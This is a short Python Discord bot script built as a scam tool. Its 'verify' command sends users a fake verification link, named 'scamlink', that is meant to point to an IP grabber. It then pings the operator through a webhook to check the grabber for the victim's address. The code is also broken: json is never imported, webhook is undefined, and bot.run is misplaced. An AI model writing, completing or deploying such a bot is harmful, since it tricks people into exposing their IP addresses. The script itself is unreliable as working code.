import discord 
from discord.ext import commands
import os
import time
import string
import random
import threading
import requests

scamlink = "putipgrabberhere"

token = "token-here"

prefix = "!"

msg = "someone has done the command please check ur ip grabber"

bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

@bot.command()
async def verify(ctx):
 embed = discord.Embed(title='Verify',description=f'Click To Verify {scamlink}')
 await ctx.author.send(embed=embed)
 username = "Webhook"
 message = msg
 data = json.dumps({
        "content": message,
        "username": username,
    })
 header = {
        "content-type": "application/json"
    }
 response = requests.post(webhook, data, headers=header)
 
 bot.run(token)
